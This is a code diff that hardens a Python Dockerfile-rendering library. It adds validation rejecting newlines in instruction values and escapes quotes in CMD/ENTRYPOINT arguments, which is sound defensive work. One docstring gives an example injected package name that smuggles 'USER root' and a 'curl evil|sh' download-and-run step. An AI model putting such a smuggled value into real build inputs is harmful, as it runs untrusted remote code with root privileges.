@@ -55,6 +55,24 @@ class Instruction(Protocol):
     def render(self) -> str: ...
 
 
+def _check_single_line(value: str, *, what: str) -> str:
+    """Reject embedded newlines.
+
+    Every instruction here is line-oriented, so a newline in a value does not
+    escape a string — it ends the instruction and starts a new one. A package
+    name of ``git\\nUSER root\\nRUN curl evil|sh`` would otherwise render three
+    real instructions. That needs no attacker to bite: any value that happens
+    to carry a trailing newline silently produces a structurally different
+    Dockerfile.
+    """
+    if "\n" in value or "\r" in value:
+        raise DockerfileError(
+            f"{what} may not contain a newline: {value!r}. "
+            "Values are interpolated into line-oriented instructions."
+        )
+    return value
+
+
 def _quote(value: str) -> str:
     """Quote a value for ENV/LABEL/ARG.
 
@@ -81,7 +99,11 @@ def _check_path(path: str, *, instruction: str) -> str:
 def _render_pairs(keyword: str, pairs: Mapping[str, str]) -> str:
     if not pairs:
         raise DockerfileError(f"{keyword}: no key/value pairs given")
-    rendered = [f"{key}={_quote(value)}" for key, value in pairs.items()]
+    rendered = [
+        f"{_check_single_line(key, what=f'{keyword} key')}="
+        f"{_quote(_check_single_line(value, what=f'{keyword} value'))}"
+        for key, value in pairs.items()
+    ]
     if len(rendered) == 1:
         return f"{keyword} {rendered[0]}"
     body = " \\\n    ".join(rendered)
@@ -168,6 +190,7 @@ class From:
     def render(self) -> str:
         if not self.image:
             raise DockerfileError("FROM: empty image reference")
+        _check_single_line(self.image, what="FROM image")
         head = "FROM"
         if self.platform:
             head += f" --platform={self.platform}"
@@ -183,9 +206,10 @@ class Arg:
     default: str | None = None
 
     def render(self) -> str:
+        name = _check_single_line(self.name, what="ARG name")
         if self.default is None:
-            return f"ARG {self.name}"
-        return f"ARG {self.name}={_quote(self.default)}"
+            return f"ARG {name}"
+        return f"ARG {name}={_quote(_check_single_line(self.default, what='ARG default'))}"
 
 
 @dataclass(frozen=True, slots=True)
@@ -226,6 +250,8 @@ class Run:
             raise DockerfileError("RUN: no commands given")
         if any(not c.strip() for c in normalized):
             raise DockerfileError("RUN: blank command")
+        for command in normalized:
+            _check_single_line(command, what="RUN command")
         object.__setattr__(self, "commands", normalized)
         object.__setattr__(self, "mounts", tuple(mounts))
 
@@ -287,7 +313,9 @@ class User:
     name: str
 
     def render(self) -> str:
-        return f"USER {self.name}"
+        if not self.name.strip():
+            raise DockerfileError("USER: empty name")
+        return f"USER {_check_single_line(self.name, what='USER name')}"
 
 
 @dataclass(frozen=True, slots=True)
@@ -301,7 +329,10 @@ class Cmd:
         object.__setattr__(self, "argv", normalized)
 
     def render(self) -> str:
-        rendered = ", ".join(f'"{a}"' for a in self.argv)
+        rendered = ", ".join(
+            '"{}"'.format(_check_single_line(a, what="argv entry").replace('"', '\\"'))
+            for a in self.argv
+        )
         return f"CMD [{rendered}]"
 
 
@@ -316,7 +347,10 @@ class Entrypoint:
         object.__setattr__(self, "argv", normalized)
 
     def render(self) -> str:
-        rendered = ", ".join(f'"{a}"' for a in self.argv)
+        rendered = ", ".join(
+            '"{}"'.format(_check_single_line(a, what="argv entry").replace('"', '\\"'))
+            for a in self.argv
+        )
         return f"ENTRYPOINT [{rendered}]"
 
 
